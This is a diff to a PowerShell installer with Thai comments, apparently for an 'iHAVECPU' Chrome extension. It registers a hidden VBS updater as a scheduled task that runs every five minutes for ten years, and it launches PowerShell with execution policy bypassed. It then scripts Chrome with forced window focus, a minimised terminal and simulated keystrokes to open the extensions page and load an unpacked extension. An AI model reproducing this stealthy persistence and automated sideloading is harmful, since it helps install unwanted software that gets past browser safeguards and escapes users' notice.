@@ -84,24 +84,22 @@ Write-Host "2/3 กำลังตั้งค่าระบบดึงอั�
 $vbsScript = Join-Path $permanentDirectory "silent-updater.vbs"
 $updaterScript = Join-Path $permanentDirectory "update-extension.ps1"
 $taskName = "iHAVECPU-Extension-AutoUpdater"
-$wscriptCmd = "wscript.exe //B //NoLogo `"$vbsScript`""
+$wscriptCmd = "wscript.exe `"$vbsScript`""
 
 $taskCreated = $false
 try {
-  $schtasksArgs = @("/Create", "/SC", "MINUTE", "/MO", "5", "/TN", $taskName, "/TR", $wscriptCmd, "/F")
-  $proc = Start-Process -FilePath "schtasks.exe" -ArgumentList $schtasksArgs -NoNewWindow -Wait -PassThru -ErrorAction Stop
-  if ($proc.ExitCode -eq 0) {
-    $taskCreated = $true
-  }
-} catch {}
-
-if (-not $taskCreated) {
+  $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$vbsScript`""
+  $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
+  $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
+  Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($triggerRepeat) -Settings $settings -Force -ErrorAction Stop | Out-Null
+  $taskCreated = $true
+} catch {
   try {
-    $action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "//B //NoLogo `"$vbsScript`""
-    $triggerRepeat = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 5) -RepetitionDuration (New-TimeSpan -Days 3650)
-    $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
-    Register-ScheduledTask -TaskName $taskName -Action $action -Trigger @($triggerRepeat) -Settings $settings -Force | Out-Null
-    $taskCreated = $true
+    $schtasksLine = "/Create /SC MINUTE /MO 5 /TN `"$taskName`" /TR `"wscript.exe '$vbsScript'`" /F"
+    $proc = Start-Process -FilePath "schtasks.exe" -ArgumentList $schtasksLine -NoNewWindow -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
+    if ($proc.ExitCode -eq 0) {
+      $taskCreated = $true
+    }
   } catch {}
 }
 
@@ -114,7 +112,7 @@ try {
 
 try {
   if (Test-Path -LiteralPath $vbsScript) {
-    Start-Process -FilePath "wscript.exe" -ArgumentList "//B //NoLogo `"$vbsScript`"" -WindowStyle Hidden
+    Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsScript`"" -WindowStyle Hidden
   } elseif (Test-Path -LiteralPath $updaterScript) {
     Start-Process -FilePath "powershell.exe" -ArgumentList "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$updaterScript`" -Silent" -WindowStyle Hidden
   }
@@ -157,34 +155,65 @@ function Install-ExtensionViaChromeUI($chromeExe, $extFolder) {
   Add-Type -AssemblyName UIAutomationTypes -ErrorAction SilentlyContinue
   Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
 
-  if (-not ("Win32WindowHelper" -as [type])) {
+  if (-not ("Win32WindowHelperV2" -as [type])) {
     Add-Type @"
 using System;
 using System.Runtime.InteropServices;
-public class Win32WindowHelper {
+public class Win32WindowHelperV2 {
   [DllImport("user32.dll")] public static extern bool SetForegroundWindow(IntPtr hWnd);
   [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+  [DllImport("user32.dll")] public static extern IntPtr GetForegroundWindow();
+  [DllImport("user32.dll")] public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);
+  [DllImport("user32.dll")] public static extern bool AttachThreadInput(uint idAttach, uint idAttachTo, bool fAttach);
+  [DllImport("user32.dll")] public static extern bool BringWindowToTop(IntPtr hWnd);
+  [DllImport("user32.dll")] public static extern void SwitchToThisWindow(IntPtr hWnd, bool fAltTab);
+  [DllImport("user32.dll")] public static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);
+  [DllImport("user32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+  public static extern IntPtr FindWindowEx(IntPtr parentHandle, IntPtr childAfter, string lclassName, string windowTitle);
+
+  public static void ForceForeground(IntPtr hWnd) {
+    if (hWnd == IntPtr.Zero) return;
+    IntPtr fg = GetForegroundWindow();
+    if (fg != IntPtr.Zero && fg != hWnd) {
+      uint dummy;
+      uint fgThread = GetWindowThreadProcessId(fg, out dummy);
+      uint targetThread = GetWindowThreadProcessId(hWnd, out dummy);
+      if (fgThread != targetThread && fgThread != 0 && targetThread != 0) {
+        AttachThreadInput(fgThread, targetThread, true);
+        ShowWindow(hWnd, 9);
+        BringWindowToTop(hWnd);
+        SetForegroundWindow(hWnd);
+        AttachThreadInput(fgThread, targetThread, false);
+      }
+    }
+    keybd_event(0x12, 0, 0, UIntPtr.Zero);
+    keybd_event(0x12, 0, 2, UIntPtr.Zero);
+    ShowWindow(hWnd, 9);
+    BringWindowToTop(hWnd);
+    SetForegroundWindow(hWnd);
+    SwitchToThisWindow(hWnd, true);
+  }
 }
 "@ -ErrorAction SilentlyContinue
   }
 
   $wsh = New-Object -ComObject WScript.Shell
+  $terminalHwnd = [Win32WindowHelperV2]::GetForegroundWindow()
 
-  # เปิด Chrome พร้อมเปิดโหมด Accessibility สำหรับ UI Automation
-  Start-Process -FilePath $chromeExe -ArgumentList @("--force-renderer-accessibility", "chrome://extensions/") | Out-Null
+  # เปิดแท็บใหม่ใน Chrome พร้อมเปิดโหมด Accessibility
+  Start-Process -FilePath $chromeExe -ArgumentList @("--force-renderer-accessibility", "about:blank") | Out-Null
   Start-Sleep -Milliseconds 1200
 
-  # ค้นหาหน้าต่าง Chrome ล่าสุด
+  # ค้นหาหน้าต่างหลักของ Chrome
   $chromeWin = $null
   $deadline = (Get-Date).AddSeconds(8)
   while ((Get-Date) -lt $deadline) {
     $procs = Get-Process chrome -ErrorAction SilentlyContinue | Where-Object { $_.MainWindowHandle -ne 0 }
     if ($procs) {
-      $chromeWin = $procs | Sort-Object StartTime -Descending | Select-Object -First 1
-      if (-not $chromeWin) { $chromeWin = $procs | Select-Object -First 1 }
+      $chromeWin = $procs | Select-Object -First 1
       break
     }
-    Start-Sleep -Milliseconds 300
+    Start-Sleep -Milliseconds 250
   }
 
   if (-not $chromeWin) {
@@ -192,24 +221,64 @@ public class Win32WindowHelper {
   }
 
   $hwnd = $chromeWin.MainWindowHandle
-  try {
-    [Win32WindowHelper]::ShowWindow($hwnd, 9) | Out-Null
-    [Win32WindowHelper]::SetForegroundWindow($hwnd) | Out-Null
-    $wsh.AppActivate($chromeWin.Id) | Out-Null
-  } catch {}
-  Start-Sleep -Milliseconds 400
 
-  # ตรวจสอบว่าเปิดหน้า chrome://extensions/ หรือยัง (เนื่องจาก Chrome มักบล็อกพารามิเตอร์ chrome:// จาก Command Line)
-  $title = [string]$chromeWin.MainWindowTitle
-  if ($title -notmatch "Extensions|ส่วนขยาย") {
+  # ย่อหน้าต่าง Terminal ลงเพื่อไม่ให้แย่งโฟกัสปุ่มคีย์บอร์ดจาก Chrome
+  if ($terminalHwnd -ne [IntPtr]::Zero -and $terminalHwnd -ne $hwnd) {
+    try { [Win32WindowHelperV2]::ShowWindow($terminalHwnd, 6) | Out-Null } catch {}
+  }
+
+  [Win32WindowHelperV2]::ForceForeground($hwnd)
+  try { $wsh.AppActivate($chromeWin.Id) | Out-Null } catch {}
+  Start-Sleep -Milliseconds 500
+
+  $root = [System.Windows.Automation.AutomationElement]::FromHandle($hwnd)
+
+  # บังคับเปิดหน้า chrome://extensions/ ผ่านช่อง Address Bar (Omnibox)
+  for ($attempt = 0; $attempt -lt 2; $attempt++) {
+    $chromeWin.Refresh()
+    if ([string]$chromeWin.MainWindowTitle -match "Extensions|ส่วนขยาย") {
+      break
+    }
+
+    [Win32WindowHelperV2]::ForceForeground($hwnd)
+    Start-Sleep -Milliseconds 250
+
+    # ลองโฟกัสช่อง Address Bar (OmniboxViewViews) ด้วย UI Automation ก่อน
+    if ($root) {
+      try {
+        $omniCond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ClassNameProperty, "OmniboxViewViews")
+        $omnibox = $root.FindFirst([System.Windows.Automation.TreeScope]::Descendants, $omniCond)
+        if ($omnibox) {
+          $omnibox.SetFocus()
+          Start-Sleep -Milliseconds 150
+        }
+      } catch {}
+    }
+
     try {
-      [Win32WindowHelper]::SetForegroundWindow($hwnd) | Out-Null
       Set-Clipboard -Value "chrome://extensions/"
-      $wsh.SendKeys("^l")
-      Start-Sleep -Milliseconds 200
-      $wsh.SendKeys("^v{ENTER}")
-      Start-Sleep -Milliseconds 1500
-    } catch {}
+      [System.Windows.Forms.SendKeys]::SendWait("^l")
+      Start-Sleep -Milliseconds 250
+      [System.Windows.Forms.SendKeys]::SendWait("^v")
+      Start-Sleep -Milliseconds 150
+      [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
+    } catch {
+      try {
+        $wsh.SendKeys("^l")
+        Start-Sleep -Milliseconds 250
+        $wsh.SendKeys("^v{ENTER}")
+      } catch {}
+    }
+
+    # รอให้หน้า chrome://extensions/ โหลดขึ้นมา
+    $navWait = (Get-Date).AddSeconds(3)
+    while ((Get-Date) -lt $navWait) {
+      Start-Sleep -Milliseconds 300
+      $chromeWin.Refresh()
+      if ([string]$chromeWin.MainWindowTitle -match "Extensions|ส่วนขยาย") {
+        break
+      }
+    }
   }
 
   # คืนค่าที่อยู่โฟลเดอร์ส่วนขยายกลับเข้า Clipboard ทันที
@@ -217,12 +286,23 @@ public class Win32WindowHelper {
     Set-Clipboard -Value $extFolder
   } catch {}
 
-  # พยายามกดเปิด Developer Mode + กด Load unpacked + เลือกโฟลเดอร์ให้อัตโนมัติผ่าน UI Automation
-  $root = [System.Windows.Automation.AutomationElement]::FromHandle($hwnd)
   if (-not $root) { return $false }
 
+  # กระตุ้น Accessibility Tree ของหน้าเว็บภายใน Chrome (Chrome_RenderWidgetHostHWND)
+  try {
+    $renderHwnd = [Win32WindowHelperV2]::FindWindowEx($hwnd, [IntPtr]::Zero, "Chrome_RenderWidgetHostHWND", $null)
+    if ($renderHwnd -ne [IntPtr]::Zero) {
+      $renderEl = [System.Windows.Automation.AutomationElement]::FromHandle($renderHwnd)
+      if ($renderEl) {
+        $null = $renderEl.FindFirst([System.Windows.Automation.TreeScope]::Children, [System.Windows.Automation.Condition]::TrueCondition)
+      }
+    }
+  } catch {}
+
+  Start-Sleep -Milliseconds 600
+
   $loadBtn = $null
-  $uiDeadline = (Get-Date).AddSeconds(6)
+  $uiDeadline = (Get-Date).AddSeconds(7)
   while ((Get-Date) -lt $uiDeadline) {
     # 1. ค้นหาปุ่ม Load unpacked ("โหลดส่วนขยายที่คลายแพ็กแล้ว" / "Load unpacked" / AutomationId: loadUnpacked)
     $idCond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::AutomationIdProperty, "loadUnpacked")
@@ -268,7 +348,7 @@ public class Win32WindowHelper {
 
   # รอหน้าต่างเลือกโฟลเดอร์ (Dialog #32770) เด้งขึ้นมา
   $dialog = $null
-  $dlgDeadline = (Get-Date).AddSeconds(5)
+  $dlgDeadline = (Get-Date).AddSeconds(6)
   while ((Get-Date) -lt $dlgDeadline) {
     $dlgCond = New-Object System.Windows.Automation.PropertyCondition([System.Windows.Automation.AutomationElement]::ClassNameProperty, "#32770")
     $dialog = $root.FindFirst([System.Windows.Automation.TreeScope]::Children, $dlgCond)
@@ -283,7 +363,7 @@ public class Win32WindowHelper {
     return $false
   }
 
-  Start-Sleep -Milliseconds 300
+  Start-Sleep -Milliseconds 350
   try {
     Set-Clipboard -Value $extFolder
   } catch {}
@@ -312,7 +392,7 @@ public class Win32WindowHelper {
       try {
         $editBox.SetFocus()
         Start-Sleep -Milliseconds 150
-        $wsh.SendKeys("^a^v")
+        [System.Windows.Forms.SendKeys]::SendWait("^a^v")
         $pathFilled = $true
       } catch {}
     }
@@ -332,7 +412,7 @@ public class Win32WindowHelper {
     return $true
   }
 
-  $wsh.SendKeys("{ENTER}")
+  [System.Windows.Forms.SendKeys]::SendWait("{ENTER}")
   Start-Sleep -Milliseconds 500
   return $true
 }
